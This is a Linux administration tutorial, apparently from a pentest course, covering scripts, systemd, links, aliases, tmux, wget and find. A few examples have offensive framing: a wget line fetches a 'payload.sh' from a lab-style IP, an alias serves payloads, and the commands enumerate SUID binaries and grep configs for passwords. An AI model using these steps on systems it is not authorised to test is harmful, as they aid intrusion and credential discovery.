# Day 06 (Cont.): Linux Core Administration, Services & Tooling

---

## 1. Script Installation & Execution

Running custom scripts (Bash, Python, binaries) is central to automation, system administration, and security testing.

### 1.1 Script Preparation Workflow
Every executable script requires three elements:
1. **Shebang (`#!`)**: Tells the kernel which interpreter to use.
2. **Execute Permission**: The execute bit (`+x`) must be granted.
3. **Execution Path**: Running via relative path (`./script.sh`), absolute path (`/opt/tools/script.sh`), or placing it in `$PATH`.

```bash
# 1. Create a sample script
cat << 'EOF' > sysinfo.sh
#!/bin/bash
echo "[*] Hostname: $(hostname)"
echo "[*] Kernel:   $(uname -r)"
echo "[*] Uptime:   $(uptime -p)"
EOF

# 2. Grant execute permission
chmod +x sysinfo.sh

# 3. Execute via relative path
./sysinfo.sh
```

### 1.2 Common Shebang Interpreters
| Interpreter | Shebang Line | Description |
| :--- | :--- | :--- |
| **Bash** | `#!/bin/bash` | Standard Linux Bourne-Again Shell |
| **POSIX Sh** | `#!/bin/sh` | Portable shell script across all UNIX systems |
| **Python 3** | `#!/usr/bin/env python3` | Resolves Python 3 from the active environment `$PATH` |
| **Perl** | `#!/usr/bin/env perl` | Perl script execution |
| **Ruby** | `#!/usr/bin/env ruby` | Ruby script execution |

### 1.3 Adding Scripts to the System `$PATH`
To run a script from anywhere without prefixing `./`, it must reside in a directory listed in `$PATH`.

```bash
# Check your current PATH
echo $PATH

# Method A: Copy script to a standard system binary directory (requires sudo)
sudo cp sysinfo.sh /usr/local/bin/sysinfo
sysinfo  # Runs directly from any directory

# Method B: Add a personal script directory to PATH (user-level)
mkdir -p ~/.local/bin
cp sysinfo.sh ~/.local/bin/sysinfo

# Append to ~/.bashrc or ~/.zshrc for persistence
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc
```

> [!WARNING]
> **PATH Poisoning Security Hazard:** Never place `.` (current directory) at the beginning of your `$PATH` (e.g. `PATH=.:$PATH`). If an attacker drops a malicious binary named `ls` in `/tmp` and you type `ls`, your shell will run the attacker's binary first!

---

## 2. Help Systems on Linux

Linux provides built-in documentation so you never have to guess flags or syntax.

| Documentation Tool | Command Syntax | Description | Best Used For |
| :--- | :--- | :--- | :--- |
| **Built-in Flag** | `command --help` or `-h` | Prints quick summary of options and flags directly to terminal | Fast syntax checks |
| **Manual Pages** | `man <command>` | Full detailed manual formatted with pager (`less`) | In-depth parameter study |
| **Keyword Search** | `apropos <keyword>` | Searches short man page descriptions for matching keywords | Finding unknown tools |
| **One-Line Summary** | `whatis <command>` | Displays a single-sentence definition of what the binary does | Quick command identification |
| **Command Type** | `type <command>` | Identifies if command is a binary, alias, shell builtin, or function | Troubleshooting command conflicts |
| **Binary Location** | `which <command>` | Prints the exact absolute path that `$PATH` resolves | Locating binary execution path |
| **Extended Search** | `whereis <command>` | Locates binary, source code, and man page locations on disk | Complete file footprint |

### 2.1 Navigating Manual (`man`) Sections
Manual pages are divided into numbered sections:

| Section # | Content Category | Example |
| :---: | :--- | :--- |
| **1** | User Commands (Executable binaries) | `man 1 ls`, `man 1 tar` |
| **2** | System Calls (Kernel functions) | `man 2 open`, `man 2 fork` |
| **3** | C Library Functions (glibc) | `man 3 printf` |
| **4** | Special Files (usually in `/dev`) | `man 4 null`, `man 4 tty` |
| **5** | File Formats & Conventions | `man 5 passwd`, `man 5 shadow`, `man 5 crontab` |
| **8** | System Administration Commands | `man 8 useradd`, `man 8 iptables` |

```bash
# Example: Inspect file format of /etc/passwd vs the useradd command:
man 5 passwd   # Explains the 7 colon-separated fields
man 1 passwd   # Explains the binary to change passwords
```

---

## 3. Linux Services & Daemons (`systemd`)

A **service** (or daemon) is a long-running background process that performs system tasks without user interaction (e.g., SSH, Apache, Nginx, cron). Modern Linux distributions manage services via **`systemd`** using **`systemctl`**.

### 3.1 Service Lifecycle Management Table
| Action | Modern `systemctl` Command | Legacy `service` Equivalent | Operational Effect |
| :--- | :--- | :--- | :--- |
| **Check Status** | `sudo systemctl status ssh` | `sudo service ssh status` | Displays active state, PID, uptime, and latest logs |
| **Start Service** | `sudo systemctl start ssh` | `sudo service ssh start` | Starts service immediately (runtime only) |
| **Stop Service** | `sudo systemctl stop ssh` | `sudo service ssh stop` | Terminates running service |
| **Restart Service** | `sudo systemctl restart ssh`| `sudo service ssh restart` | Stops and restarts service (refreshes all state) |
| **Reload Config** | `sudo systemctl reload nginx`| `sudo service nginx reload`| Reloads config files without dropping connections |
| **Enable on Boot** | `sudo systemctl enable ssh` | `sudo update-rc.d ssh enable`| Creates symlink to auto-start on boot |
| **Disable Boot** | `sudo systemctl disable ssh`| `sudo update-rc.d ssh disable`| Prevents service from auto-starting on reboot |
| **Enable & Start** | `sudo systemctl enable --now ssh` | N/A | Enables and immediately starts in one command |

### 3.2 Inspecting Service Logs (`journalctl`)
```bash
# View all logs for a specific service:
sudo journalctl -u ssh

# Follow logs in real-time (like tail -f):
sudo journalctl -u ssh -f

# View the last 50 log lines for a service:
sudo journalctl -u ssh -n 50 --no-pager
```

### 3.3 Creating a Custom Systemd Service
To turn any script into a managed system daemon:
1. Create `/etc/systemd/system/myscript.service`:
```ini
[Unit]
Description=Custom Background Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/sysinfo
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
```
2. Reload systemd and start:
```bash
sudo systemctl daemon-reload
sudo systemctl enable --now myscript.service
```

---

## 4. Symbolic & Hard Links (`ln`)

Links create filesystem references to files or directories without duplicating physical disk blocks.

```
       [ Symbolic Link (Soft) ] ──────────► [ File Path Name ]
                                                   │
                                                   ▼
       [ Original File Name   ] ──────────► [ INODE Number ] ────────► [ Disk Blocks ]
                                                   ▲
       [ Hard Link            ] ───────────────────┘
```

### 4.1 Soft Links vs. Hard Links
| Feature / Attribute | Symbolic Link (Soft Link) | Hard Link |
| :--- | :--- | :--- |
| **Command** | `ln -s <target> <linkname>` | `ln <target> <linkname>` |
| **Points to** | File **path / filename string** | **Inode number** directly |
| **Cross-Filesystem** | Yes (can link across disks/partitions) | No (must exist on same filesystem) |
| **Directory Linking**| Yes | No (prevents circular loops) |
| **Target Deleted** | **Broken link** (points to nothing) | **Data preserved** (inode link count decreases by 1) |
| **Inode Number** | Gets its own unique inode | Shares the exact same inode as target |
| **Visual in `ls -l`**| `lrwxrwxrwx ... link -> target` | Shows higher link count (column 2) |

### 4.2 Practical Commands
```bash
# Create a symbolic link:
ln -s /var/log/nginx/access.log ~/nginx_access.log

# Verify the symlink and its target:
ls -l ~/nginx_access.log
# lrwxrwxrwx 1 user user 26 Nov 13 19:30 nginx_access.log -> /var/log/nginx/access.log

# Create a hard link:
ln document.txt document_backup.txt

# Inspect inodes of both files (they match!):
ls -i document.txt document_backup.txt
```

---

## 5. Shell Aliases (`alias`)

An **alias** is a user-defined shortcut for a command or complex command pipeline.

### 5.1 Alias Administration
```bash
# 1. Create a temporary alias (valid for current session only):
alias ll='ls -lah --color=auto'

# 2. View all currently defined aliases:
alias

# 3. Remove an alias:
unalias ll

# 4. Bypass an alias temporarily (run original binary):
\ls
# or use full path:
/bin/ls
```

### 5.2 Making Aliases Permanent
Aliases set in the terminal disappear when the session closes. To make them permanent, add them to `~/.bashrc` (for Bash) or `~/.zshrc` (for Zsh):
```bash
cat << 'EOF' >> ~/.bashrc

# Custom Productivity & Security Aliases
alias update='sudo apt update && sudo apt upgrade -y'
alias ports='sudo ss -tulnp'
alias myip='curl -s ifconfig.me'
alias grep='grep --color=auto'
alias ..='cd ..'
alias ...='cd ../..'
EOF

# Reload configuration immediately:
source ~/.bashrc
```

### 5.3 Useful Security & Pentest Aliases
| Alias Definition | Command Target | Purpose |
| :--- | :--- | :--- |
| `alias ports='sudo ss -tulnp'` | `ss -tulnp` | Quick audit of all listening network ports |
| `alias myip='curl -s ifconfig.me'` | `curl` | Rapidly inspect external public IP address |
| `alias serve='python3 -m http.server 80'`| Python HTTP | Quick local web server for payload transfer |
| `alias suid='find / -perm -4000 2>/dev/null'`| `find` | Instant enumeration of SUID binaries |

---

## 6. Terminal Multiplexer (`tmux`)

**tmux** allows multiple terminal sessions inside a single window, and keeps sessions running in the background even if your SSH connection drops.

```
+─────────────────────────────────────────────────────────────+
|                    TMUX SESSION: "pentest"                  |
+──────────────────────────────┬──────────────────────────────+
| Window 1: nmap_scan          | Window 2: web_enum           |
|  ┌────────────────────────┐  |  ┌────────────────────────┐  |
|  │ Nmap port scan running │  |  │ Gobuster directory fuzz│  |
|  │                        │  |  │                        │  |
|  ├────────────────────────┤  |  └────────────────────────┘  |
|  │ Netcat reverse listener│  |                              |
|  └────────────────────────┘  |                              |
+──────────────────────────────┴──────────────────────────────+
```

### 6.1 Session Management CLI
| Action | Command |
| :--- | :--- |
| **Start New Session** | `tmux` |
| **Start Named Session** | `tmux new -s <session_name>` |
| **List Running Sessions** | `tmux ls` |
| **Attach to Session** | `tmux attach -t <session_name>` (or `tmux a -t <name>`) |
| **Kill a Session** | `tmux kill-session -t <session_name>` |
| **Kill All Sessions** | `tmux kill-server` |

### 6.2 Keybindings (Default Prefix: `Ctrl + b`)
All tmux keyboard shortcuts require pressing the prefix key **`Ctrl + b`**, releasing it, and then pressing the shortcut key:

| Shortcut Category | Key Sequence | Action |
| :--- | :--- | :--- |
| **Session Control** | `Ctrl + b` then `d` | **Detach** from session (leaves everything running in background) |
| **Pane Splitting** | `Ctrl + b` then `%` | Split current pane **vertically** (left/right) |
| | `Ctrl + b` then `"` | Split current pane **horizontally** (top/bottom) |
| **Pane Navigation** | `Ctrl + b` then `Arrow Key` | Move focus between panes |
| | `Ctrl + b` then `x` | Close current active pane |
| | `Ctrl + b` then `z` | Zoom/maximize active pane (toggle full screen) |
| **Window Control** | `Ctrl + b` then `c` | Create a brand **new window** (tab) |
| | `Ctrl + b` then `n` / `p` | Switch to **next** / **previous** window |
| | `Ctrl + b` then `0-9` | Jump directly to window number `0-9` |

---

## 7. Network File Downloader (`wget`)

`wget` is a non-interactive command-line tool for downloading files from the web via HTTP, HTTPS, and FTP.

### 7.1 Common Options & Syntax
```bash
wget [options] [URL]
```

| Flag | Meaning | Example | Use Case |
| :--- | :--- | :--- | :--- |
| `-O <file>` | Output file name | `wget -O exploit.py http://site.com/raw/12` | Save download under a custom filename |
| `-P <dir>` | Directory prefix | `wget -P /opt/tools/ http://site.com/tool.tar.gz` | Download directly into a target folder |
| `-c` | Continue (resume) | `wget -c http://site.com/huge_wordlist.txt` | Resumes interrupted downloads |
| `-b` | Background | `wget -b http://site.com/large_archive.iso` | Runs download in the background (logs to `wget-log`) |
| `-q` | Quiet mode | `wget -q http://site.com/script.sh` | Suppresses output (great for scripts) |
| `--limit-rate`| Rate limiting | `wget --limit-rate=500k http://site.com/file.zip` | Prevents saturation of network bandwidth |
| `--no-check-certificate` | Skip SSL | `wget --no-check-certificate https://internal.dev/`| Downloads from self-signed HTTPS servers |
| `-r` | Recursive mirror | `wget -r -np -k http://target.com/docs/` | Recursively mirrors directories / websites |

```bash
# Practical Example: Download an exploit in background with custom filename:
wget -q -O /tmp/payload.sh http://10.10.14.2:8000/payload.sh
```

---

## 8. File Searching & Discovery (`find`)

`find` dynamically walks directory hierarchies to locate files matching names, types, sizes, permissions, or modification dates.

### 8.1 Command Structure
```
find  <starting_directory>  <matching_criteria>  <actions>
```

### 8.2 Common `find` Options Table
| Filter Option | Purpose | Example |
| :--- | :--- | :--- |
| `-name <pattern>` | Case-sensitive name search | `find /etc -name "*.conf"` |
| `-iname <pattern>` | Case-insensitive name search | `find /var/www -iname "config.php"` |
| `-type <f\|d\|l>` | Filter by type: file (`f`), directory (`d`), symlink (`l`) | `find /home -type f -name "*.sh"` |
| `-size <+/-N>` | Filter by size (`k`, `M`, `G`) | `find /var/log -type f -size +100M` |
| `-perm <mode>` | Search by exact or masked permissions | `find / -perm -4000 -type f 2>/dev/null` (SUID!) |
| `-user <username>` | Files owned by specific user | `find /home -user www-data` |
| `-group <group>` | Files belonging to specific group | `find /var -group secops` |
| `-mtime <+/-N>` | Modified N days ago (`-1` = last 24h) | `find /etc -type f -mtime -7` |
| `-empty` | Matches empty files or folders | `find /tmp -type f -empty` |

### 8.3 Executing Actions on Results (`-exec`)
```bash
# 1. Find all .log files and show detailed metadata:
find /var/log -name "*.log" -exec ls -lh {} +

# 2. Find and delete temporary files safely:
find /tmp -type f -name "*.tmp" -delete

# 3. Search for a string inside all configuration files:
find /etc -name "*.conf" -exec grep -Hn "password" {} + 2>/dev/null
```

---

## Hands-on Lab: System Tooling & Discovery Pipeline

**Objective:** Combine scripts, aliases, links, and discovery into a practical workflow.

1. **Create and install a custom diagnostic script:**
   ```bash
   mkdir -p ~/bin
   cat << 'EOF' > ~/bin/recon_summary.sh
   #!/bin/bash
   echo "=== ACTIVE SERVICES ==="
   systemctl list-units --type=service --state=running | head -n 10
   echo "=== LISTENING SOCKETS ==="
   ss -tuln
   EOF
   chmod +x ~/bin/recon_summary.sh
   ```

2. **Create a symbolic link in `/usr/local/bin`:**
   ```bash
   sudo ln -s ~/bin/recon_summary.sh /usr/local/bin/reconsum
   reconsum  # Test execution from anywhere
   ```

3. **Define and test a persistent alias:**
   ```bash
   echo "alias recon='reconsum'" >> ~/.bashrc
   source ~/.bashrc
   recon
   ```

4. **Launch a detached tmux session:**
   ```bash
   tmux new -s audit_session
   # Inside tmux: split vertically with Ctrl+b then %
   # Detach with Ctrl+b then d
   tmux ls
   ```

5. **Search for recently modified scripts across the system:**
   ```bash
   find ~/ -type f -name "*.sh" -mtime -1
   ```
